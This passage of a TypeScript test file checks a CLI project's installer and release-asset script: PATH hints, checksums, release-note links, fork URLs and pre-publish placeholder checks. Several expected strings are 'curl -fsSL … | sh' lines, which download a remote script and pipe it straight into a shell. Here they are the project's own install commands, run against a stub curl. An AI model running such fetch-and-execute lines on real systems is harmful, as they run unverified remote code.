      [DARWIN_ARM64, '/bin/bash', '~/.bash_profile'],
      [LINUX_X64, '/bin/bash', '~/.bashrc'],
      [LINUX_X64, '/usr/bin/fish', '~/.profile'],
    ];
    for (const [target, shell, file] of cases) {
      const f = await faked(target, { SHELL: shell });
      const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--no-deps'], f.env);
      expect(result.code).toBe(0);
      expect(result.out).toContain(`請把這一行加到 ${file}`);
      expect(result.out).toContain(`export PATH="${join(f.prefix, 'bin')}:$PATH"`);
    }
    const f = await faked(LINUX_X64);
    const onPath = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--no-deps'], { ...f.env, PATH: `${join(f.prefix, 'bin')}:${f.env['PATH'] as string}` });
    expect(onPath.code).toBe(0);
    expect(onPath.out).not.toContain('不在 PATH 裡');
  });
});

describe('scripts/release-assets.sh → install.sh (the files of a GitHub release)', () => {
  const BASE = 'https://github.com/gclinian/smurg/releases/download/v9.8.7';
  const LATEST = 'https://github.com/gclinian/smurg/releases/latest/download/install.sh';
  /** The official install line's URL (apps/site: a 302 to LATEST); only the official repository's notes give it. */
  const SHORT = 'https://smurg.ai/install.sh';
  const CHANGELOG = '# 變更紀錄\n\n## [9.9.0] - later\n\n- not this one\n\n## [9.8.7] - 2026-10-01\n\n第一版（[主人指南](docs/HOSTING.md#1-安裝)、[外部](https://example.com/x)、[錨點](#已知限制)）。\n\n### 已知限制\n\n- 很多。\n\n## [0.0.1]\n\n- older\n';

  async function releaseDirs(dirs: Dirs, names: readonly string[] = TARGETS.map((t) => t.name), sub = 'r'): Promise<{ dist: string; out: string; notes: string; changelog: string }> {
    const base = join(dirs.home, sub);
    const dist = join(base, 'dist');
    for (const name of names) await writeExecutable(join(dist, name), fakeBinary(name));
    // Downloaded CI artifacts lose their mode bits: the host's copy is not executable here.
    if (names.includes(HOST_NAME)) await chmod(join(dist, HOST_NAME), 0o644);
    const changelog = join(base, 'CHANGELOG.md');
    await writeFile(changelog, CHANGELOG);
    return { dist, out: join(base, 'out'), notes: join(base, 'notes', 'notes.md'), changelog };
  }

  const assets = (args: readonly string[]): Promise<Run> => runShell('/bin/bash', [RELEASE_ASSETS, ...args], { PATH: SYSTEM_PATH, HOME: '/nonexistent' });

  it('writes the four executables, SHA256SUMS, install.sh with this tag’s URL, and the notes; that install.sh installs from it', async () => {
    const dirs = await setup();
    const r = await releaseDirs(dirs);
    const built = await assets(['--version', '9.8.7', '--base-url', BASE, '--dist', r.dist, '--out', r.out, '--require-all', '--notes', r.notes, '--changelog', r.changelog]);
    expect(built.out).toContain(`install the latest release with:  curl -fsSL ${SHORT} | sh`);
    expect(built.out).toContain(`install the latest release with:  curl -fsSL ${LATEST} | sh`);
    expect(built.code).toBe(0);
    const sums = await readFile(join(r.out, 'SHA256SUMS'), 'utf8');
    expect(sums).toBe(
      [...TARGETS]
        .sort((a, b) => a.name.localeCompare(b.name))
        .map((t) => `${sha(fakeBinary(t.name))}  ${t.name}\n`)
        .join(''),
    );
    for (const target of TARGETS) expect((await stat(join(r.out, target.name))).mode & 0o777).toBe(0o755);
    const script = await readFile(join(r.out, 'install.sh'), 'utf8');
    expect(script.split('\n').filter((line) => line.startsWith('SMURG_RELEASE_BASE_URL='))).toEqual([`SMURG_RELEASE_BASE_URL='${BASE}'`]);
    expect(script.replace(`SMURG_RELEASE_BASE_URL='${BASE}'`, "SMURG_RELEASE_BASE_URL=''")).toBe(await readFile(INSTALL, 'utf8'));

    const notes = await readFile(r.notes, 'utf8');
    // Relative links point at the files of this tag (release notes are shown on the releases page).
    expect(notes.startsWith('第一版（[主人指南](https://github.com/gclinian/smurg/blob/v9.8.7/docs/HOSTING.md#1-安裝)、[外部](https://example.com/x)、[錨點](#已知限制)）。\n\n### 已知限制\n\n- 很多。\n\n## 安裝\n')).toBe(true);
    expect(notes).not.toContain('not this one');
    expect(notes).not.toContain('older');
    // The official install line first, then the same file's GitHub URL as the fallback, then this release's own.
    const lines = notes.split('\n');
    const order = [`curl -fsSL ${SHORT} | sh`, `curl -fsSL ${LATEST} | sh`, `curl -fsSL ${BASE}/install.sh | sh`].map((line) => lines.indexOf(line));
    expect(order.every((at) => at > 0)).toBe(true);
    expect([...order].sort((a, b) => a - b)).toEqual(order);
    expect(notes).toContain('連不上 smurg.ai 時');
    expect(notes).toContain(sums);

    // `curl -fsSL …/install.sh | sh` with nothing but the baked-in URL: a stand-in curl serves the release directory
    // for that URL (and nothing else), so the asset names are exactly what the installer asks for.
    const f = await faked(LINUX_X64, { FAKE_CURL_PREFIX: BASE, FAKE_CURL_ROOT: r.out });
    await writeExecutable(
      join(f.dirs.home, 'fakebin', 'curl'),
      `#!/bin/sh\nout=''; prev=''; url=''\nfor a in "$@"; do [ "$prev" = -o ] && out="$a"; prev="$a"; url="$a"; done\necho "curl $*" >>"$FAKE_LOG"\ncase "$url" in\n  "$FAKE_CURL_PREFIX"/*) src="$FAKE_CURL_ROOT/\${url#"$FAKE_CURL_PREFIX"/}"; [ -f "$src" ] || exit 22; cp "$src" "$out" ;;\n  *) exit 6 ;;\nesac\n`,
    );
    for (const shell of SHELLS) {
      const result = await runShell(shell, ['-s', '--', '--no-deps'], f.env, script);
      expect(result.out).toContain('fake smurg-linux-x64');
      expect(result.code).toBe(0);
    }
    expect(await readFile(join(f.dirs.home, '.local', 'bin', 'smurg'), 'utf8')).toBe(fakeBinary('smurg-linux-x64'));
    const fetched = (await f.calls()).filter((call) => call.startsWith('curl '));
    expect(fetched.length).toBeGreaterThan(0);
    for (const call of fetched) {
      expect(call).toContain('--proto =https --proto-redir =https');
      expect(call).toMatch(new RegExp(`${BASE.replace(/[.]/g, '\\.')}/(SHA256SUMS|smurg-linux-x64)$`));
    }
  });

  it("a fork's release notes give its own GitHub URLs only (smurg.ai installs the official release)", async () => {
    const dirs = await setup();
    const r = await releaseDirs(dirs);
    const forkBase = 'https://github.com/someone/smurg-fork/releases/download/v9.8.7';
    const built = await assets(['--version', '9.8.7', '--base-url', forkBase, '--dist', r.dist, '--out', r.out, '--notes', r.notes, '--changelog', r.changelog]);
    expect(built.code).toBe(0);
    const notes = await readFile(r.notes, 'utf8');
    expect(notes).toContain('curl -fsSL https://github.com/someone/smurg-fork/releases/latest/download/install.sh | sh');
    expect(notes).toContain(`curl -fsSL ${forkBase}/install.sh | sh`);
    expect(notes).not.toContain('smurg.ai');
    expect(built.out).not.toContain('smurg.ai');
  });

  it('refuses a release that misses a platform (--require-all), a changelog without the version, a wrong version', async () => {
    const dirs = await setup();
    const partial = await releaseDirs(dirs, ['smurg-darwin-arm64', 'smurg-linux-x64', HOST_NAME], 'partial');
    const missing = await assets(['--version', '9.8.7', '--base-url', BASE, '--dist', partial.dist, '--out', partial.out, '--require-all']);
    expect(missing.code).not.toBe(0);
    expect(missing.out).toMatch(/missing in .*: .*smurg-/);
    expect(existsSync(partial.out)).toBe(false);

    // Without this machine's executable nothing is run, so the changelog is what refuses 9.8.8.
    const others = await releaseDirs(dirs, TARGETS.map((t) => t.name).filter((name) => name !== HOST_NAME), 'others');
    const noSection = await assets(['--version', '9.8.8', '--base-url', BASE.replace('9.8.7', '9.8.8'), '--dist', others.dist, '--out', others.out, '--notes', others.notes, '--changelog', others.changelog]);
    expect(noSection.code).not.toBe(0);
    expect(noSection.out).toContain('has no section for 9.8.8');
    expect(existsSync(others.notes)).toBe(false);

    // This machine's executable must report exactly the release's version.
    const full = await releaseDirs(dirs, TARGETS.map((t) => t.name), 'full');
    const wrong = await assets(['--version', '9.8.8', '--base-url', BASE.replace('9.8.7', '9.8.8'), '--dist', full.dist, '--out', full.out]);
    expect(wrong.code).not.toBe(0);
    expect(wrong.out).toContain(`${HOST_NAME} reports 'smurg 9.8.7 (fake ${HOST_NAME})', not smurg 9.8.8`);

    const tag = await assets(['--version', 'v9.8.7', '--base-url', BASE, '--dist', full.dist, '--out', full.out]);
    expect(tag.code).toBe(2);
    expect(tag.out).toContain('no leading v');
    const http = await assets(['--version', '9.8.7', '--base-url', 'http://example.invalid/x', '--dist', full.dist, '--out', full.out]);
    expect(http.code).toBe(2);
  });

  it('--check-arch refuses a file that is not the executable its name says', async () => {
    const dirs = await setup();
    const r = await releaseDirs(dirs);
    const result = await assets(['--version', '9.8.7', '--base-url', BASE, '--dist', r.dist, '--out', r.out, '--check-arch']);
    expect(result.code).not.toBe(0);
    expect(result.out).toContain('is not the executable its name says');
  });

  it('--publish-checks (before a tag is built): a dated section, no placeholders, the built-in relay, one version everywhere', async () => {
    const dirs = await setup();
    // The script works from the repository it lives in: a copy of it in a stand-in repository.
    const repo = join(dirs.home, 'repo');
    const script = join(repo, 'scripts', 'release-assets.sh');
    await writeExecutable(script, await readFile(RELEASE_ASSETS, 'utf8'));
    const put = async (path: string, text: string): Promise<void> => {
      await mkdir(dirname(join(repo, path)), { recursive: true });
      await writeFile(join(repo, path), text);
    };
    const pkg = (version: string): string => `{\n  "name": "x",\n  "version": "${version}",\n  "private": true\n}\n`;
    const relay = (value: string): string => `// the built-in relay\nexport const DEFAULT_RELAY_URL: string | null = ${value};\n`;
    const check = (version: string, base = BASE.replace('9.8.7', version)): Promise<Run> =>
      runShell('/bin/bash', [script, '--version', version, '--base-url', base, '--publish-checks'], { PATH: SYSTEM_PATH, HOME: '/nonexistent' });

    // Everything still to fill in, as in the repository before the first deploy.
    await put('CHANGELOG.md', '# 變更紀錄\n\n## [9.8.7] - Unreleased\n\n- 公用 relay：<RELAY_URL>\n');
    await put('README.md', '公用 relay <RELAY_URL>\n');
    await put('docs/HOSTING.md', 'https://smurg-relay.<account-subdomain>.workers.dev\n');
    await put('docs/JOINING.md', `nothing to fill in\ncurl -fsSL ${SHORT} | sh\n`);
    await put('packages/cli/src/relay/default-relay.ts', relay('null'));
    for (const path of ['package.json', 'apps/relay/package.json', 'packages/cli/package.json', 'tests/e2e/package.json']) await put(path, pkg('9.8.7'));
    await put('packages/daemon/package.json', pkg('0.0.0'));
    const before = await check('9.8.7');
    expect(before.code).toBe(1);
    expect(before.out).toContain("the heading '## [9.8.7] - Unreleased' has no release date");
    expect(before.out).toContain('CHANGELOG.md: the 9.8.7 section still has a placeholder');
    expect(before.out).toContain('README.md still has a placeholder');
    expect(before.out).toContain('docs/HOSTING.md still has a placeholder');
    expect(before.out).not.toContain('docs/JOINING.md');
    expect(before.out).toContain('DEFAULT_RELAY_URL is not the deployed relay');
    expect(before.out).toContain("packages/daemon/package.json: version '0.0.0', not 9.8.7");
    expect(before.out).not.toContain('packages/cli/package.json');
    // The official repository's docs show the smurg.ai install line.
    expect(before.out).toContain(`README.md does not show the official install line  curl -fsSL ${SHORT} | sh`);
    expect(before.out).toContain(`docs/HOSTING.md does not show the official install line  curl -fsSL ${SHORT} | sh`);

    // Filled in, but README.md still names another relay than the binary's built-in one, and shows only the GitHub
    // install URL (the fallback) instead of the official line.
    await put('CHANGELOG.md', '# 變更紀錄\n\n## [9.8.7] - 2026-10-02\n\n- 公用 relay：https://app.example.org\n');
    await put('README.md', `curl -fsSL ${LATEST} | sh\n公用 relay https://smurg-relay.example.workers.dev\n`);
    await put('docs/HOSTING.md', `curl -fsSL ${SHORT} | sh\n公用 relay https://app.example.org\n`);
    await put('docs/JOINING.md', `curl -fsSL ${SHORT} | sh\n邀請連結 https://app.example.org/join/<id>#…\n`);
    await put('packages/cli/src/relay/default-relay.ts', relay("'https://app.example.org'"));
    await put('packages/daemon/package.json', pkg('9.8.7'));
    const stale = await check('9.8.7');
    expect(stale.code).toBe(1);
    expect(stale.out).toContain('README.md does not name the built-in relay https://app.example.org');
    expect(stale.out).toContain(`README.md does not show the official install line  curl -fsSL ${SHORT} | sh`);
    // The workers.dev address README.md still gives is not the built-in relay's: a stale address of the shared relay.
    expect(stale.out).toContain('README.md names a workers.dev address that is not the built-in relay: https://smurg-relay.example.workers.dev');
    expect(stale.out).not.toContain('docs/HOSTING.md');
    expect(stale.out).not.toContain('docs/JOINING.md');
    expect(stale.out).not.toContain('CHANGELOG.md');
    // A fork's release is not installed through smurg.ai: its docs need no smurg.ai line (the relay check stays), and
    // its relay may well be on workers.dev.
    const fork = await check('9.8.7', 'https://github.com/someone/smurg-fork/releases/download/v9.8.7');
    expect(fork.code).toBe(1);
    expect(fork.out).toContain('README.md does not name the built-in relay');
    expect(fork.out).not.toContain('install line');
    expect(fork.out).not.toContain('workers.dev address');

    // Filled in: a pre-release tag of the same X.Y.Z passes too.
    await put('README.md', `curl -fsSL ${SHORT} | sh\n公用 relay https://app.example.org\n`);
    const ready = await check('9.8.7');
    expect(ready.out).toContain('9.8.7 is ready to publish');
    expect(ready.code).toBe(0);

    // A self-hosted relay's workers.dev address written with a placeholder is fine; a concrete one other than the
    // built-in relay is not, in the version's section either; and docs/JOINING.md shows the official install line too.
    await put('docs/HOSTING.md', `curl -fsSL ${SHORT} | sh\n公用 relay https://app.example.org\n自己架設：https://smurg-relay.<你的子網域>.workers.dev\n`);
    expect((await check('9.8.7')).code).toBe(0);
    await put('CHANGELOG.md', '# 變更紀錄\n\n## [9.8.7] - 2026-10-02\n\n- 公用 relay：https://app.example.org（之前是 https://smurg-relay.old-sub.workers.dev）\n');
    await put('docs/JOINING.md', '邀請連結 https://app.example.org/join/<id>#…\n');
    const old = await check('9.8.7');
    expect(old.code).toBe(1);
    expect(old.out).toContain('CHANGELOG.md: the 9.8.7 section names a workers.dev address that is not the built-in relay: https://smurg-relay.old-sub.workers.dev');
    expect(old.out).toContain(`docs/JOINING.md does not show the official install line  curl -fsSL ${SHORT} | sh`);
    expect(old.out).not.toContain('docs/HOSTING.md');
    expect(old.out).not.toContain('README.md');
    // The built-in relay itself on workers.dev (as before 2026-10-01): naming it is not stale.
    await put('packages/cli/src/relay/default-relay.ts', relay("'https://smurg-relay.mine.workers.dev'"));
    for (const doc of ['README.md', 'docs/HOSTING.md', 'docs/JOINING.md']) await put(doc, `curl -fsSL ${SHORT} | sh\n公用 relay https://smurg-relay.mine.workers.dev\n`);
    await put('CHANGELOG.md', '# 變更紀錄\n\n## [9.8.7] - 2026-10-02\n\n- 公用 relay：https://smurg-relay.mine.workers.dev\n');
    expect((await check('9.8.7')).code).toBe(0);

    await put('CHANGELOG.md', '# 變更紀錄\n\n## [9.8.7-rc.1] - 2026-10-02\n\n- 試用版\n');
    expect((await check('9.8.7-rc.1')).code).toBe(0);
  });
});
